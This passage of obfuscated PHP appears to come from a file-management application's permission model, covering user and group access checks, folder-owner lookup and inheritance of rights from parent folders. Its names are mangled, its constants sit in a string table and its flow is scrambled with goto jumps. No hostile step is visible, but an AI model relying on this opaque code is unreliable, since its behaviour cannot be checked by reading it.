$D÷ğ¸Ã¹¤Ÿ[$BŒÚÉ™“Ä[1692]]; if ($D÷ğ¸Ã¹¤Ÿ[$BŒÚÉ™“Ä[1528]] && $D÷ğ¸Ã¹¤Ÿ[$BŒÚÉ™“Ä[1528]] == $fŒˆÊÌÀÜ£) { continue; } $dãá¹Øö“î[] = array($BŒÚÉ™“Ä[395] => $dÛí¶öÉ[$BŒÚÉ™“Ä[395]], $BŒÚÉ™“Ä[404] => $fÍËóÄ¸Å, $BŒÚÉ™“Ä[484] => intval($a¢ƒ±ğ†›), $BŒÚÉ™“Ä[1787] => isset($b­øµÀèà[$BŒÚÉ™“Ä[393]]) ? intval($b­øµÀèà[$BŒÚÉ™“Ä[393]]) : 0, $BŒÚÉ™“Ä[1841] => isset($b­øµÀèà[$BŒÚÉ™“Ä[1841]]) ? intval($b­øµÀèà[$BŒÚÉ™“Ä[1841]]) : -1); } $dãá¹Øö“î[] = array($BŒÚÉ™“Ä[395] => $dÛí¶öÉ[$BŒÚÉ™“Ä[395]], $BŒÚÉ™“Ä[404] => SourceModel::TYPE_USER, $BŒÚÉ™“Ä[484] => intval($fŒˆÊÌÀÜ£), $BŒÚÉ™“Ä[1787] => intval($DÏæ§Ó‘Ä†), $BŒÚÉ™“Ä[1841] => -1); $this->where(array($BŒÚÉ™“Ä[410] => $dÛí¶öÉ[$BŒÚÉ™“Ä[395]]))->delete(); $this->addAll($dãá¹Øö“î); } return !0; } public function get($A¥ÜÈ¯†î) { $EĞå½ê²ª = $this->getSourceList(array($A¥ÜÈ¯†î), !0); return $EĞå½ê²ª[0]; } public function getSourceList($C¼¸ÈÈ÷Ú, $cÇ×½š‚Ö = false, $E›Ñ›ùÇ„ = false) { goto a°§æ™šöß; A¨®‚·õ‘: foreach ($cÇ×½š‚Ö as $AĞ¨ŠŠ‘Ë => $BÅ‡ùÖ¥àç) { $DäŠ››ŸÑ“ = $eË÷È“Ì—™->parentLevelArray($BÅ‡ùÖ¥àç[$e‰ó§µ´Ü[487]]); $eÃ·³Ğ®Ø = array_merge($eÃ·³Ğ®Ø, array($AĞ¨ŠŠ‘Ë), array_reverse($DäŠ››ŸÑ“)); } $eÃ·³Ğ®Ø = array_values(array_unique($eÃ·³Ğ®Ø)); if (!$eÃ·³Ğ®Ø) { return array(); } goto Eà©³ç‘ç; cÜÁ‰Ü²º´: $b‚°±Ÿ¼…¾ = array(); foreach ($cÇ×½š‚Ö as $bÎ‡âšÊÛÍ => $AŠ‰²ôÀ) { if ($c·½Å³°Ş) { $b‚°±Ÿ¼…¾[$bÎ‡âšÊÛÍ] = $DÔñæª›©À; continue; } $b‚°±Ÿ¼…¾[$bÎ‡âšÊÛÍ] = $this->makeSourceAuth($AŠ‰²ôÀ, $eŸª–ê·½, $E›Ñ›ùÇ„); } return $b‚°±Ÿ¼…¾; goto AŒ‡·—À†; e„‹†º‘Æ‡: if (!$cÇ×½š‚Ö && count($C¼¸ÈÈ÷Ú) == 1) { $cÇ×½š‚Ö = array(); $cÇ×½š‚Ö[$C¼¸ÈÈ÷Ú[0]] = $eË÷È“Ì—™->sourceInfo($C¼¸ÈÈ÷Ú[0]); } if (!$cÇ×½š‚Ö) { $a‘éƒ–Ëğï = array($e‰ó§µ´Ü[410] => array($e‰ó§µ´Ü[411], $C¼¸ÈÈ÷Ú)); $cÇ×½š‚Ö = $eË÷È“Ì—™->field($e‰ó§µ´Ü[1867])->where($a‘éƒ–Ëğï)->select(); $cÇ×½š‚Ö = array_to_keyvalue($cÇ×½š‚Ö, $e‰ó§µ´Ü[395]); } $eÃ·³Ğ®Ø = $C¼¸ÈÈ÷Ú; goto A¨®‚·õ‘; a°§æ™šöß: $e‰ó§µ´Ü =& $_SERVER[œº]; if (!$C¼¸ÈÈ÷Ú) { return array(); } $eË÷È“Ì—™ = Model($e‰ó§µ´Ü[1206]); goto e„‹†º‘Æ‡; eªƒ«ÂÁÅ: $c·½Å³°Ş = $this->userIsRoot($E›Ñ›ùÇ„); $Bñë¹¥»é = AuthModel::authAll(); $DÔñæª›©À = array($e‰ó§µ´Ü[407] => $Bñë¹¥»é, $e‰ó§µ´Ü[1868] => array($e‰ó§µ´Ü[412] => 0, $e‰ó§µ´Ü[1698] => $Bñë¹¥»é, $e‰ó§µ´Ü[413] => LNG($e‰ó§µ´Ü[1869]), $e‰ó§µ´Ü[1713] => $e‰ó§µ´Ü[1870])); goto cÜÁ‰Ü²º´; Eà©³ç‘ç: $a“Çç‡Øøà = $this->sourceAuthSelect($eÃ·³Ğ®Ø); $eŸª–ê·½ = array(); foreach ($eÃ·³Ğ®Ø as $bÎ‡âšÊÛÍ) { if (isset($a“Çç‡Øøà[$bÎ‡âšÊÛÍ])) { $eŸª–ê·½[$bÎ‡âšÊÛÍ] = $a“Çç‡Øøà[$bÎ‡âšÊÛÍ]; } } goto eªƒ«ÂÁÅ; AŒ‡·—À†: } public function authDeepCheck($b£³ÆÄÈÔÆ, $E†µ¥åŠÏ = false) { goto DÑ©ó¤èŒ; Bãó–: if (!in_array($b£³ÆÄÈÔÆ, $A‚µÊ§ ï½[$c¶ñí¤ä÷²[1871]])) { return !1; } $dô®ØñµŒ = array(); foreach ($A‚µÊ§ ï½[$c¶ñí¤ä÷²[1872]] as $bà¸áï§ => $B¦¾õêëêÍ) { if (!in_array($b£³ÆÄÈÔÆ, $B¦¾õêëêÍ)) { continue; } $dô®ØñµŒ[] = $bà¸áï§; } goto bâÜÂƒ É; DÑ©ó¤èŒ: $c¶ñí¤ä÷² =& $_SERVER[œº]; $E†µ¥åŠÏ = $E†µ¥åŠÏ ? $E†µ¥åŠÏ : USER_ID; $A‚µÊ§ ï½ = $this->makeAuthDeep($E†µ¥åŠÏ); goto Bãó–; bâÜÂƒ É: if (!$dô®ØñµŒ) { return !1; } $føÄÖ™‰š = $dô®ØñµŒ ? $dô®ØñµŒ[0] : $b£³ÆÄÈÔÆ; return array($c¶ñí¤ä÷²[407] => -1, $c¶ñí¤ä÷²[446] => array($c¶ñí¤ä÷²[412] => $c¶ñí¤ä÷²[1085], $c¶ñí¤ä÷²[1698] => $c¶ñí¤ä÷²[191], $c¶ñí¤ä÷²[413] => LNG($c¶ñí¤ä÷²[1873]), $c¶ñí¤ä÷²[1713] => $c¶ñí¤ä÷²[1874]), $c¶ñí¤ä÷²[1875] => LNG($c¶ñí¤ä÷²[1876]), $c¶ñí¤ä÷²[1877] => $this->sourceAuthInfo($føÄÖ™‰š)); goto eÙÔÒ¡ô¡À; eÙÔÒ¡ô¡À: } protected function makeAuthDeep($a¸…Û–ÛÕí = false) { goto aæÛ¹›èŸí; BèÄîÆ›š¦: foreach ($aéã‡ö·Ğ as $A‘ŠìÈ³²¿) { if ($A‘ŠìÈ³²¿[$DÀ¥â‚öÖ[406]] == 0 && $A‘ŠìÈ³²¿[$DÀ¥â‚öÖ[1714]] == $DÀ¥â‚öÖ[87]) { $fÒÍ‘èëßµ[] = $A‘ŠìÈ³²¿[$DÀ¥â‚öÖ[393]]; } } $c…¹Íé‡ = $this->userGroupParents($a¸…Û–ÛÕí); $C®¯Å…„¤ = array($DÀ¥â‚öÖ[404] => SourceModel::TYPE_USER, $DÀ¥â‚öÖ[484] => $a¸…Û–ÛÕí); goto e«¢ä‰›ŠÓ; Cä½Ë‚Û: $d†×Ó‚»à = array_to_keyvalue_group($F„»°””Ú, $DÀ¥â‚öÖ[395]); foreach ($d†×Ó‚»à as $AôªíİĞƒ³ => $dÆ–ãİèğ÷) { $bêâÇöÀ¾Ä = $this->authArrayCheck($dÆ–ãİèğ÷, $a¸…Û–ÛÕí); if ($bêâÇöÀ¾Ä[$DÀ¥â‚öÖ[407]] > 0) { $AÊÓÑŠ—‹[] = $AôªíİĞƒ³ . $DÀ¥â‚öÖ[33]; } } $FÄº«ğ¼Â— = array(); goto f¾ƒâğŞ¿Å; f¾ƒâğŞ¿Å: $cªšŸ™ğù– = $c…¹Íé‡; $FÊ©­´äîñ = Model($DÀ¥â‚öÖ[1206]); $bŞØÕìŸ¯Å = Model($DÀ¥â‚öÖ[486]); goto fòÒÖšØÅ; C¹‰óòòöÓ: $aâªçõªÉĞ = array(); if ($AÊÓÑŠ—‹) { $eÁ¤ôñèö¡ = $FÊ©­´äîñ->where(array($DÀ¥â‚öÖ[395] => array($DÀ¥â‚öÖ[411], $AÊÓÑŠ—‹)))->select(); foreach ($eÁ¤ôñèö¡ as $aìÆ¡˜¼ƒÈ) { $aêœ‚Å×Æ¿ = $FÊ©­´äîñ->parentLevelArray($aìÆ¡˜¼ƒÈ[$DÀ¥â‚öÖ[487]]); $FÄº«ğ¼Â— = array_merge($FÄº«ğ¼Â—, $aêœ‚Å×Æ¿); $cªšŸ™ğù–[] = $aìÆ¡˜¼ƒÈ[$DÀ¥â‚öÖ[484]]; $eõ¦Ù¿Ú±Ñ[$aìÆ¡˜¼ƒÈ[$DÀ¥â‚öÖ[395]]] = $aêœ‚Å×Æ¿; $FŒÄ›˜œ[$aìÆ¡˜¼ƒÈ[$DÀ¥â‚öÖ[395]]] = $aìÆ¡˜¼ƒÈ[$DÀ¥â‚öÖ[484]]; } } $cªšŸ™ğù– = array_values(array_unique($cªšŸ™ğù–)); goto e«”†»…ëÔ; e«”†»…ëÔ: $B¬—¤¤ ğÉ = $cªšŸ™ğù–; foreach ($B¬—¤¤ ğÉ as $A™‚Êâã–È) { $BàËå†»•² = $bŞØÕìŸ¯Å->getInfo($A™‚Êâã–È); $aêœ‚Å×Æ¿ = $FÊ©­´äîñ->parentLevelArray($BàËå†»•²[$DÀ¥â‚öÖ[487]]); $cªšŸ™ğù– = array_merge($cªšŸ™ğù–, $aêœ‚Å×Æ¿); } $cªšŸ™ğù– = array_values(array_unique($cªšŸ™ğù–)); goto c”«‚Úğ´; FÏ…Ëáâ½: if (isset($dâ¶Ê°¦ [$a¸…Û–ÛÕí])) { return $dâ¶Ê°¦ [$a¸…Û–ÛÕí]; } $aéã‡ö·Ğ = Model($DÀ¥â‚öÖ[1878])->listData(); $fÒÍ‘èëßµ = array(); goto BèÄîÆ›š¦; b İ‰Ì¶Èé: $BÚ¹„±äÄÑ = array($DÀ¥â‚öÖ[1871] => $FÄº«ğ¼Â—, $DÀ¥â‚öÖ[1872] => $eõ¦Ù¿Ú±Ñ); $dâ¶Ê°¦ [$a¸…Û–ÛÕí] = $BÚ¹„±äÄÑ; return $BÚ¹„±äÄÑ; goto DŞ´¬ôêô“; fòÒÖšØÅ: $eõ¦Ù¿Ú±Ñ = array(); $FŒÄ›˜œ = array(); $bÉÀÙºÍœÒ = array(); goto C¹‰óòòöÓ; e«¢ä‰›ŠÓ: if ($c…¹Íé‡) { $C®¯Å…„¤ = array(array($DÀ¥â‚öÖ[404] => SourceModel::TYPE_USER, $DÀ¥â‚öÖ[484] => $a¸…Û–ÛÕí), array($DÀ¥â‚öÖ[404] => SourceModel::TYPE_GROUP, $DÀ¥â‚öÖ[484] => array($DÀ¥â‚öÖ[411], $c…¹Íé‡)), $DÀ¥â‚öÖ[957] => $DÀ¥â‚öÖ[1779]); } $F„»°””Ú = $this->field($DÀ¥â‚öÖ[1879])->where($C®¯Å…„¤)->select(); $AÊÓÑŠ—‹ = array(); goto Cä½Ë‚Û; aæÛ¹›èŸí: $DÀ¥â‚öÖ =& $_SERVER[œº]; static $dâ¶Ê°¦  = array(); $a¸…Û–ÛÕí = $a¸…Û–ÛÕí ? $a¸…Û–ÛÕí : USER_ID; goto FÏ…Ëáâ½; c”«‚Úğ´: foreach ($cªšŸ™ğù– as $A™‚Êâã–È) { $BàËå†»•² = $bŞØÕìŸ¯Å->getInfo($A™‚Êâã–È); $FÄº«ğ¼Â—[] = $BàËå†»•²[$DÀ¥â‚öÖ[85]][$DÀ¥â‚öÖ[395]]; $bÉÀÙºÍœÒ[$A™‚Êâã–È] = $BàËå†»•²[$DÀ¥â‚öÖ[85]][$DÀ¥â‚öÖ[395]]; $aâªçõªÉĞ[$A™‚Êâã–È] = $FÊ©­´äîñ->parentLevelArray($BàËå†»•²[$DÀ¥â‚öÖ[487]]); } foreach ($eõ¦Ù¿Ú±Ñ as $A‹Ì½Î­Ñ => $fÊàšØ‘Ç¹) { $FÁ´Ñ¯È³¶ = $FŒÄ›˜œ[$A‹Ì½Î­Ñ]; if (!$FÁ´Ñ¯È³¶ || !$bÉÀÙºÍœÒ[$FÁ´Ñ¯È³¶]) { continue; } $BšÍğ“Òà = array(); foreach ($aâªçõªÉĞ[$FÁ´Ñ¯È³¶] as $A™‚Êâã–È) { $BšÍğ“Òà[] = $bÉÀÙºÍœÒ[$A™‚Êâã–È]; } $eõ¦Ù¿Ú±Ñ[$A‹Ì½Î­Ñ] = array_merge($BšÍğ“Òà, $fÊàšØ‘Ç¹); } $FÄº«ğ¼Â— = array_values(array_unique($FÄº«ğ¼Â—)); goto b İ‰Ì¶Èé; DŞ´¬ôêô“: } private function makeSourceAuth($DÒ·…ğµ¶Ï, $Bİ©Ÿî¼Ïí, $AËÜáˆÖù” = false) { goto e“¼¦§ëìá; E©ÑÀ˜”Í: $e¾š‹Ş¤¨ò = $DÒ·…ğµ¶Ï[$d›ÓŠ¦óËç[404]] == SourceModel::TYPE_GROUP; $Eà¬†æï–¶ = $e¾š‹Ş¤¨ò ? $this->groupRootAuth($c™¯“šŒÉ, $AËÜáˆÖù”) : !1; if ($Eà¬†æï–¶ && Model($d›ÓŠ¦óËç[1859])->authCheckAction($Eà¬†æï–¶[$d›ÓŠ¦óËç[406]], $d›ÓŠ¦óËç[1712])) { return $this->groupAuthInfo($Eà¬†æï–¶, $c™¯“šŒÉ); } goto bÓ¹‹²Ş©©; e“¼¦§ëìá: $d›ÓŠ¦óËç =& $_SERVER[œº]; $D½Èµ×–‹Ê = $d›ÓŠ¦óËç[87]; $c™¯“šŒÉ = $DÒ·…ğµ¶Ï[$d›ÓŠ¦óËç[484]]; goto E©ÑÀ˜”Í; eÃ’¬‡Ù‰Œ: if (!$Dè¼ÃÔ¸Ò) { $AèÒªï§¢ = Model($d›ÓŠ¦óËç[486])->getInfo($c™¯“šŒÉ); $cÓ˜¶äÍŒ = explode($d›ÓŠ¦óËç[47], trim($AèÒªï§¢[$d›ÓŠ¦óËç[487]], $d›ÓŠ¦óËç[47])); $cÓ˜¶äÍŒ = array_reverse($cÓ˜¶äÍŒ); foreach ($cÓ˜¶äÍŒ as $a•ÀºÙÏÀ) { if ($a•ÀºÙÏÀ == $d›ÓŠ¦óËç[191] || $a•ÀºÙÏÀ == $D½Èµ×–‹Ê) { continue; } $FíÖ¬—’Ê = $this->groupRootAuth($a•ÀºÙÏÀ, $AËÜáˆÖù”); if (!$FíÖ¬—’Ê) { continue; } $Dè¼ÃÔ¸Ò = $this->groupAuthInfo($FíÖ¬—’Ê, $a•ÀºÙÏÀ); break; } } if (!$Dè¼ÃÔ¸Ò || $Dè¼ÃÔ¸Ò[$d›ÓŠ¦óËç[407]] <= 0) { $Cß±ªÉ¹êó = $this->authDeepCheck($DÒ·…ğµ¶Ï[$d›ÓŠ¦óËç[395]], $AËÜáˆÖù”); if ($Cß±ªÉ¹êó) { $Dè¼ÃÔ¸Ò = $Cß±ªÉ¹êó; } } return $Dè¼ÃÔ¸Ò; goto B„‰Ô¼×ÇĞ; D‹ÍÖ¦: foreach ($A…¥¦®†‹à as $DïíŒøô‚«) { if (!isset($Bİ©Ÿî¼Ïí[$DïíŒøô‚«])) { continue; } $F³˜‘Ø¡¶Ä = $this->authMake($Bİ©Ÿî¼Ïí[$DïíŒøô‚«], $AËÜáˆÖù”); if ($F³˜‘Ø¡¶Ä[$d›ÓŠ¦óËç[446]]) { $Dè¼ÃÔ¸Ò = $F³˜‘Ø¡¶Ä; break; } } if (!$e¾š‹Ş¤¨ò) { return $Dè¼ÃÔ¸Ò; } if (!$Dè¼ÃÔ¸Ò && $Eà¬†æï–¶) { $Dè¼ÃÔ¸Ò = $this->groupAuthInfo($Eà¬†æï–¶, $c™¯“šŒÉ); } goto eÃ’¬‡Ù‰Œ; bÓ¹‹²Ş©©: $A…¥¦®†‹à = Model($d›ÓŠ¦óËç[1206])->parentLevelArray($DÒ·…ğµ¶Ï[$d›ÓŠ¦óËç[487]]); $A…¥¦®†‹à = array_merge(array($DÒ·…ğµ¶Ï[$d›ÓŠ¦óËç[395]]), array_reverse($A…¥¦®†‹à)); $Dè¼ÃÔ¸Ò = !1; goto D‹ÍÖ¦; B„‰Ô¼×ÇĞ: } private function userIsRoot($F²”¶â´‡Ä = false) { $F¥Ğ°æã÷ê =& $_SERVER[œº]; if (!$F²”¶â´‡Ä && _get($GLOBALS, $F¥Ğ°æã÷ê[485])) { return !0; } $bÉóå·ê… = Model($F¥Ğ°æã÷ê[506])->getInfo($F²”¶â´‡Ä); $fçÌÈìÖğ´ = Model($F¥Ğ°æã÷ê[1880])->listData($bÉóå·ê…[$F¥Ğ°æã÷ê[1411]]); if ($fçÌÈìÖğ´ && $fçÌÈìÖğ´[$F¥Ğ°æã÷ê[1283]][$F¥Ğ°æã÷ê[1881]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Dİîñ°¶‡®) { goto FÜ¦ÂÊÚ°; d‚¡£¨¼ÑĞ: if (!$DÌ„›Üøãï) { return !1; } $E‡ä˜‘‰×Ò->groupPathDisplay($DÌ„›Üøãï); $D–ØÙÎ¬³ = array($DÌ„›Üøãï); goto då•Î¤éº·; A¾Ò§¼ŒÓ‰: if (isset($DÌ„›Üøãï[$Cëê§âë³[492]])) { $Bï‰³­¦†İ = explode($Cëê§âë³[8], trim($DÌ„›Üøãï[$Cëê§âë³[495]], $Cëê§âë³[8])); array_shift($Bï‰³­¦†İ); $cš¢åÅš“Í = $DÌ„›Üøãï[$Cëê§âë³[490]] . $Cëê§âë³[1882] . implode($Cëê§âë³[8], $Bï‰³­¦†İ); } return array($Cëê§âë³[413] => $DÌ„›Üøãï[$Cëê§âë³[28]], $Cëê§âë³[76] => KodIO::make($DÌ„›Üøãï[$Cëê§âë³[395]]), $Cëê§âë³[1883] => $cš¢åÅš“Í); goto cØë—ĞÒ¶­; FÜ¦ÂÊÚ°: $Cëê§âë³ =& $_SERVER[œº]; $E‡ä˜‘‰×Ò = Model($Cëê§âë³[1206]); $DÌ„›Üøãï = $E‡ä˜‘‰×Ò->sourceInfo($Dİîñ°¶‡®); goto d‚¡£¨¼ÑĞ; då•Î¤éº·: $D–ØÙÎ¬³ = $E‡ä˜‘‰×Ò->_listAppendPath($D–ØÙÎ¬³); $DÌ„›Üøãï = $D–ØÙÎ¬³[0]; $cš¢åÅš“Í = $DÌ„›Üøãï[$Cëê§âë³[495]]; goto A¾Ò§¼ŒÓ‰; cØë—ĞÒ¶­: } private function groupAuthInfo($bŸ¼åÌµó, $b¼Î­ÂÔµ¡) { $câ©ˆÎÆÃ§ =& $_SERVER[œº]; $F÷ÏŒĞÙÕñ = Model($câ©ˆÎÆÃ§[486])->getInfo($b¼Î­ÂÔµ¡); return array($câ©ˆÎÆÃ§[1884] => intval($bŸ¼åÌµó[$câ©ˆÎÆÃ§[406]]), $câ©ˆÎÆÃ§[1868] => $bŸ¼åÌµó, $câ©ˆÎÆÃ§[1885] => LNG($câ©ˆÎÆÃ§[1886]), $câ©ˆÎÆÃ§[1877] => array($câ©ˆÎÆÃ§[413] => $F÷ÏŒĞÙÕñ[$câ©ˆÎÆÃ§[28]], $câ©ˆÎÆÃ§[76] => KodIO::make($F÷ÏŒĞÙÕñ[$câ©ˆÎÆÃ§[85]][$câ©ˆÎÆÃ§[395]]), $câ©ˆÎÆÃ§[1883] => $F÷ÏŒĞÙÕñ[$câ©ˆÎÆÃ§[491]])); } protected function groupRootAuth($A‡ë£……“Á, $A¾™Ø¶çô“ = false) { goto AŒ“«ÔÏ¨“; AŒ“«ÔÏ¨“: $d­—“¹İ² =& $_SERVER[œº]; $A¾™Ø¶çô“ = $A¾™Ø¶çô“ ? $A¾™Ø¶çô“ : USER_ID; $a©‰¬ˆ„Ïï = $A¾™Ø¶çô“ . $d­—“¹İ²[1887] . $A‡ë£……“Á; goto a•½ó±Š™; F´‰ä™¶à: $f†Õ®Ü…¡Ê[$a©‰¬ˆ„Ïï] = $C ¨ ãæ”ø ? $C ¨ ãæ”ø : $Fµ‹ùŠ‹¬Ì; return $f†Õ®Ü…¡Ê[$a©‰¬ˆ„Ïï]; goto aÉ†¥±ğ; A¼Øòº‹„‹: $F°òË†¸ª‰ = $this->userGroupList($A¾™Ø¶çô“); $Fµ‹ùŠ‹¬Ì = isset($F°òË†¸ª‰[$A‡ë£……“Á]) ? $F°òË†¸ª‰[$A‡ë£……“Á][$d­—“¹İ²[406]] : !1; if ($Fµ‹ùŠ‹¬Ì && Model($d­—“¹İ²[1859])->authCheckAction($Fµ‹ùŠ‹¬Ì[$d­—“¹İ²[406]], $d­—“¹İ²[1712])) { $f†Õ®Ü…¡Ê[$a©‰¬ˆ„Ïï] = $Fµ‹ùŠ‹¬Ì; return $Fµ‹ùŠ‹¬Ì; } goto d¯îÜ‘ğó¯; a•½ó±Š™: static $f†Õ®Ü…¡Ê = array(); if (isset($f†Õ®Ü…¡Ê[$a©‰¬ˆ„Ïï])) { return $f†Õ®Ü…¡Ê[$a©‰¬ˆ„Ïï]; } $b•— Õì = Model($d­—“¹İ²[486])->getInfo($A‡ë£……“Á); goto A¼Øòº‹„‹; d¯îÜ‘ğó¯: $AØÁä•çæ‡ = $this->sourceAuthSelect($b•— Õì[$d­—“¹İ²[85]][$d­—“¹İ²[395]]); $F†‹Ø‡¥Ô = $AØÁä•çæ‡ ? $this->authMake($AØÁä•çæ‡, $A¾™Ø¶çô“) : !1; $C ¨ ãæ”ø = $F†‹Ø‡¥Ô ? $F†‹Ø‡¥Ô[$d­—“¹İ²[446]] : !1; goto F´‰ä™¶à; aÉ†¥±ğ: } public function authOwnerApply($a…òò¶§„) { goto d¡¾¸¦Ä¬Ï; bíŒ‘ğ†ó†: $a…òò¶§„[$B³½ğ‚‡³‡[406]][$B³½ğ‚‡³‡[1890]] = Model($B³½ğ‚‡³‡[502])->userListInfo($c—¦‹ö£‡‡); return $a…òò¶§„; goto F¯©©ĞÆ¸; Fó›°Í’‚ª: $EÏ³îµÊ„ = Model($B³½ğ‚‡³‡[1206])->parentLevelArray($a…òò¶§„[$B³½ğ‚‡³‡[487]]); $EÏ³îµÊ„ = array_merge(array($a…òò¶§„[$B³½ğ‚‡³‡[395]]), array_reverse($EÏ³îµÊ„)); $d¥ê–À…¯œ = $this->sourceAuthSelect($EÏ³îµÊ„); goto Aí®ô”¯Öó; d¡¾¸¦Ä¬Ï: $B³½ğ‚‡³‡ =& $_SERVER[œº]; if (empty($a…òò¶§„[$B³½ğ‚‡³‡[406]]) || isset($a…òò¶§„[$B³½ğ‚‡³‡[1888]]) && $a…òò¶§„[$B³½ğ‚‡³‡[1888]]) { return $a…òò¶§„; } if (AuthModel::authCheckRoot($a…òò¶§„[$B³½ğ‚‡³‡[406]][$B³½ğ‚‡³‡[407]])) { return $a…òò¶§„; } goto Fó›°Í’‚ª; Aí®ô”¯Öó: $eÂµµÔ¶‡¸ = array(); $c—¦‹ö£‡‡ = array(); foreach ($d¥ê–À…¯œ as $A÷ÏÜ«ºò¯ => $f¬ğ¡¸ÕÃÓ) { $e’ƒŸŞÒìî = $this->authFolderOwnerUser($f¬ğ¡¸ÕÃÓ); $eÂµµÔ¶‡¸[$A÷ÏÜ«ºò¯] = $e’ƒŸŞÒìî; $c—¦‹ö£‡‡ = array_merge($c—¦‹ö£‡‡, $e’ƒŸŞÒìî[$B³½ğ‚‡³‡[562]]); if ($e’ƒŸŞÒìî[$B³½ğ‚‡³‡[1889]]) { break; } } goto cÄîİ”‰…º; cÄîİ”‰…º: if (count($c—¦‹ö£‡‡) == 0) { $c—¦‹ö£‡‡ = $this->authFolderOwnerGroup($a…òò¶§„[$B³½ğ‚‡³‡[484]]); } $c—¦‹ö£‡‡ = array_unique($c—¦‹ö£‡‡); if (AuthModel::authCheckRoot($a…òò¶§„[$B³½ğ‚‡³‡[406]][$B³½ğ‚‡³‡[407]])) { $c—¦‹ö£‡‡[] = USER_ID; } goto bíŒ‘ğ†ó†; F¯©©ĞÆ¸: } private function authFolderOwnerGroup($dÎº»ŸÕ÷) { $eÏˆœìÉ¾Ë =& $_SERVER[œº]; $DÈÔŒ°ó‰ª = Model($eÏˆœìÉ¾Ë[1773])->where(array($eÏˆœìÉ¾Ë[1692] => $dÎº»ŸÕ÷))->select(); $cˆ²²ÔÇø¥ = array(); if (!$DÈÔŒ°ó‰ª) { return $cˆ²²ÔÇø¥; } foreach ($DÈÔŒ°ó‰ª as $c‰Ó©Íºí¨) { $cŸØÒÔ = $this->authInfo($c‰Ó©Íºí¨); if (AuthModel::authCheckRoot($cŸØÒÔ[$eÏˆœìÉ¾Ë[406]])) { $cˆ²²ÔÇø¥[] = $c‰Ó©Íºí¨[$eÏˆœìÉ¾Ë[1528]]; } } return $cˆ²²ÔÇø¥; } private function authFolderOwnerUser($e¦¼—‹œÔˆ) { $Cñ‘İºÜ½É =& $_SERVER[œº]; $cæğ¨˜íÛº = array(); $dù°îóá£ = !1; foreach ($e¦¼—‹œÔˆ as $a›«¼¤Í) { $FíœŠ‡† = $this->authInfo($a›«¼¤Í); if ($a›«¼¤Í[$Cñ‘İºÜ½É[484]] == $Cñ‘İºÜ½É[191]) { $dù°îóá£ = !0; } if ($a›«¼¤Í[$Cñ‘İºÜ½É[404]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($FíœŠ‡†[$Cñ‘İºÜ½É[406]])) { $cæğ¨˜íÛº[] = $a›«¼¤Í[$Cñ‘İºÜ½É[484]]; } } } return array($Cñ‘İºÜ½É[562] => $cæğ¨˜íÛº, $Cñ‘İºÜ½É[1889] => $dù°îóá£); } public function authMake($A‹Õ¸ñõ½õ, $DÛÒ½ìš£ = false) { $bè®ùÓ­ =& $_SERVER[œº]; $bµ·äŞâó = $this->authArrayCheck($A‹Õ¸ñõ½õ, $DÛÒ½ìš£); if ($bµ·äŞâó[$bè®ùÓ­[1891]]) { $bµ·äŞâó[$bè®ùÓ­[1891]] = $this->sourceAuthInfo($bµ·äŞâó[$bè®ùÓ­[1891]]); } return $bµ·äŞâó; } public function authArrayCheck($CÑ¹§¹–…, $dáğŸÁèùí = false) { goto F¥ÛºŒÓ±Ë; C–Ã‘¬ÀŒ: foreach ($CÑ¹§¹–… as $b‘èÑ§ÆÙî) { $Dˆ´ ›º‹è = $this->authInfo($b‘èÑ§ÆÙî); if (!$Dˆ´ ›º‹è) { continue; } $FÀ……Åô‡Ù = $b‘èÑ§ÆÙî[$a‡‚Â‚Ñ´[484]]; $Aïšòíè‚­ = intval($Dˆ´ ›º‹è[$a‡‚Â‚Ñ´[406]]); if ($b‘èÑ§ÆÙî[$a‡‚Â‚Ñ´[404]] == SourceModel::TYPE_USER && $FÀ……Åô‡Ù == $dáğŸÁèùí) { $E„äåâö­ = !0; $cÖÏ¢ˆ’™ = $Dˆ´ ›º‹è; $E‘ùùÇ°™ = $Aïšòíè‚­; } else { if ($b‘èÑ§ÆÙî[$a‡‚Â‚Ñ´[404]] == SourceModel::TYPE_GROUP && $this->groupContainUser($FÀ……Åô‡Ù, $dáğŸÁèùí)) { $c¥²ÆÍ›ß“ = !0; $F„ÕÙ¹–ï = $this->groupStepToUserGroup($FÀ……Åô‡Ù, $dáğŸÁèùí); if ($F„ÕÙ¹–ï < $a‚¸îÀø›) { $a‚¸îÀø› = $F„ÕÙ¹–ï; $EÍ×£ê“„Ä = $Aïšòíè‚­; $B”Ì¿Æ¹™À = $Dˆ´ ›º‹è; $C‰‹œàÖã· = $FÀ……Åô‡Ù; } if ($F„ÕÙ¹–ï == $a‚¸îÀø› && $Aïšòíè‚­ >= $EÍ×£ê“„Ä) { $EÍ×£ê“„Ä = $Aïšòíè‚­; $B”Ì¿Æ¹™À = $Dˆ´ ›º‹è; $C‰‹œàÖã· = $FÀ……Åô‡Ù; } } else { if ($FÀ……Åô‡Ù == $a‡‚Â‚Ñ´[191]) { $a­Ë¤‡ÉÆç = !0; $aÙÛëÈŠê = $Dˆ´ ›º‹è; $bÄ¡¿Öô = $Aïšòíè‚­; } } } } if ($E„äåâö­) { $fŸ¶ŠÀÒÂ = $E‘ùùÇ°™; $Dˆ´ ›º‹è = $cÖÏ¢ˆ’™; $C£†ˆĞà = LNG($a‡‚Â‚Ñ´[1892]); } else { if ($c¥²ÆÍ›ß“) { $fŸ¶ŠÀÒÂ = $EÍ×£ê“„Ä; $Dˆ´ ›º‹è = $B”Ì¿Æ¹™À; $cê²ÓˆÂ„¨ = Model($a‡‚Â‚Ñ´[486])->getInfo($C‰‹œàÖã·); $C£†ˆĞà = $a‡‚Â‚Ñ´[160] . $cê²ÓˆÂ„¨[$a‡‚Â‚Ñ´[491]] . $a‡‚Â‚Ñ´[1893] . LNG($a‡‚Â‚Ñ´[1894]); } else { if ($a­Ë¤‡ÉÆç) { $fŸ¶ŠÀÒÂ = $bÄ¡¿Öô; $Dˆ´ ›º‹è = $aÙÛëÈŠê; $C£†ˆĞà = LNG($a‡‚Â‚Ñ´[1865]); } else { $fŸ¶ŠÀÒÂ = 0; $Dˆ´ ›º‹è = !1; $C£†ˆĞà = $a‡‚Â‚Ñ´[33]; } } } $BÌõ«¡ôÄÓ = array($a‡‚Â‚Ñ´[1884] => intval($fŸ¶ŠÀÒÂ), $a‡‚Â‚Ñ´[1868] => $Dˆ´ ›º‹è, $a‡‚Â‚Ñ´[1885] => $C£†ˆĞà, $a‡‚Â‚Ñ´[1877] => $b‘èÑ§ÆÙî[$a‡‚Â‚Ñ´[395]]); goto Aø¥ÆğóÔ; 